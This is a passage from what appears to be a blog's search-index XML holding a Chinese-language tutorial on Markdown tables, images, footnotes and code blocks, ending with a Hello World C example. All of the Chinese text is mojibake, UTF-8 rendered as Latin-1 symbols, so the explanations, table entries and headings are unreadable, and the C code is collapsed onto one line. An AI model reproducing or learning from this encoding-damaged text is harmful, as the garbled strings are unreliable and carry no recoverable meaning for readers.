¼çš„å†…å®¹å±…ä¸­å¯¹é½ï¼›<br>egï¼š<br>|å§“å|å¹´é¾„|å·¥ä½œ|<br>| :â€”â€“ | :â€“: | â€”â€”-:|<br>| å°å¯çˆ± |  18  | åƒå¯çˆ±å¤š  |<br>| å°å°å‹‡æ•¢ |  20  | çˆ¬æ£µå‹‡æ•¢æ ‘  |<br>| å°å°å°æœºæ™º |  22  | çœ‹ä¸€æœ¬æœºæ™ºä¹¦ |</li></ul><p>|å§“å|å¹´é¾„|å·¥ä½œ|<br>| :â€”â€“ | :â€“: | â€”â€”-:|<br>| å°å¯çˆ± |  18  | åƒå¯çˆ±å¤š  |<br>| å°å°å‹‡æ•¢ |  20  | çˆ¬æ£µå‹‡æ•¢æ ‘  |<br>| å°å°å°æœºæ™º |  22  | çœ‹ä¸€æœ¬æœºæ™ºä¹¦ |</p><h1 id="Markdownå›¾ç‰‡"><a href="#Markdownå›¾ç‰‡" class="headerlink" title="Markdownå›¾ç‰‡"></a>Markdownå›¾ç‰‡</h1><p>æ ¼å¼ï¼š<code>![å›¾ç‰‡æè¿°](å›¾ç‰‡åœ°å€)</code><br>noteï¼š</p><ul><li>å¦‚æœæ˜¯è¡Œå†…å›¾ç‰‡åˆ™æ— å›¾ä¾‹ï¼Œå¦åˆ™æœ‰å›¾ä¾‹ï¼›</li><li>ä»…æ”¯æŒ https çš„å›¾ç‰‡ï¼Œå›¾ç‰‡ç²˜è´´åˆ°ç½‘é¡µç¼–è¾‘å™¨åï¼Œä¼šè‡ªåŠ¨ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼›å¦‚æœæ˜¯æœ¬åœ°ç¼–è¾‘å™¨ï¼Œéœ€è¦æœ‰ä¸€ä¸ªç›¸å¯¹è·¯å¾„ç”¨æ¥å­˜å‚¨ä¿å­˜çš„å›¾ç‰‡ã€‚</li><li>æ”¯æŒ <code>jpgã€pngã€gifã€svg</code> ç­‰å›¾ç‰‡æ ¼å¼ï¼Œ<strong>å…¶ä¸­ svg æ–‡ä»¶ä»…å¯åœ¨å¾®ä¿¡å…¬ä¼—å¹³å°ä¸­ä½¿ç”¨</strong>ã€‚<br><img src="http://image.luokangyuan.com/4027734.jpeg" alt="å›¾ç‰‡:ã€heiheiã€‘"></li></ul><h1 id="Markdownè„šæ³¨"><a href="#Markdownè„šæ³¨" class="headerlink" title="Markdownè„šæ³¨"></a>Markdownè„šæ³¨</h1><p>æ ¼å¼ï¼š<code>[æ–‡å­—](è„šæ³¨è§£é‡Š "è„šæ³¨åå­—")</code><br>egï¼š<br>è„šæ³¨ï¼š<a href="%E8%84%9A%E6%B3%A8%E8%A7%A3%E9%87%8A" title="è„šæ³¨åå­—">æ–‡å­—</a></p><h1 id="Markdownä»£ç å—"><a href="#Markdownä»£ç å—" class="headerlink" title="Markdownä»£ç å—"></a>Markdownä»£ç å—</h1><p>æ ¼å¼ï¼šå¦‚æœåœ¨ä¸€ä¸ªè¡Œå†…éœ€è¦å¼•ç”¨ä»£ç ï¼Œåªè¦ç”¨åå¼•å·å¼•èµ·æ¥å°±å¥½ï¼›<br>egï¼šUse the <code>printf()</code> function.</p><ul><li>å¦‚æœæ˜¯åœ¨ä¸€ä¸ªå—å†…éœ€è¦å¼•ç”¨ä»£ç ï¼Œåˆ™åœ¨éœ€è¦é«˜äº®çš„ä»£ç å—çš„å‰ä¸€è¡ŒåŠåä¸€è¡Œä½¿ç”¨ä¸‰ä¸ªåå¼•å·ï¼ŒåŒæ—¶ <strong>ç¬¬ä¸€è¡Œåå¼•å·åé¢è¡¨ç¤ºä»£ç å—æ‰€ä½¿ç”¨çš„è¯­è¨€</strong>ï¼Œå¦‚ä¸‹ï¼š<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;int main(){printf("Hello World\n");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
